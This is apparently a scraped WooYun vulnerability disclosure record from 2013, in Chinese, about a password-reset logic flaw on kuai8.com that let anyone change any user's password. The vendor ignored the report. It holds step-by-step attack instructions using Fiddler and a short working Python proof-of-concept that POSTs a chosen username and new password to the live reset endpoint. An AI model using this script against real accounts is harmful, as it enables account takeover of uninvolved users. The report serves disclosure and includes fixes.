{"id": 61144, "wybug_id": "wooyun-2013-040663", "wybug_title": "快吧游戏任意用户密码修改漏洞", "wybug_corp": "kuai8.com", "wybug_author": "x-star", "wybug_date": "2013-10-22 16:41", "wybug_open_date": "2013-10-27 16:42", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["设计不当", "设计错误", "设计缺陷"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-10-22：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-10-27：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述：   快吧游戏某处处理逻辑上存在设计错误，可导致修改任意用户的密码。 详细说明：     1. 快吧游戏在找回密码处存在设计错误，可修改任意用户的密码。   2. 找回密码处泄露用户邮箱   问题出在找回密码处 http://houtai.kuai8.com/emb/find_psw.php   首先，注册一个快吧帐号，注册成功后，点找回密码，获得重置密码的链接： \n\n   打开链接，来到重置密码页面 \n\n，    打开Fiddler2 截获浏览器的请求， 输入密码后，点下一步后，密码修改成功。\n\n   看下Fiddler找到了什么？ \n\n   POST提交的表单里含有用户名和密码。 试着把用户名改成另外一个用户的，然后利用   Fiddler重新POST请求，成功修改另外一个用户123456的密码为12345678。 \n\n    漏洞证明：     后来测试下 发现发过来的重置密码链接中的key和username根本没有作用，网页端不会验证这两个值。 而是直接根据POST提交的USERNAME和PASSWORD去修改用户密码。  写了个简单的PY测试脚本\n#!/usr/bin/env python  # -*- coding: utf-8 -*- # code by x-star@unary 201309   import sys, urllib2, urlliburl = 'http://houtai.kuai8.com/emb/find_psw.php?action=auth&key=111111&username=111111&subm=sub'data = urllib.urlencode({'action':'ok',                                'username':'123456',                                        'password':'12345688'})req = urllib2.Request(url)# 使用POST方法fd = urllib2.urlopen(req, data)while True:    data = fd.read(1024)    if not len(data):        break    sys.stdout.write(data)\n另外一个问题是找回密码的时候泄露用户的邮箱\n\n   修复方案：  1. key和username绑定，重置密码的时候要判断这两个值。2. 邮箱不要步兵出镜。   版权声明：转载请注明来源 x-star@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2013-10-27 16:42 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}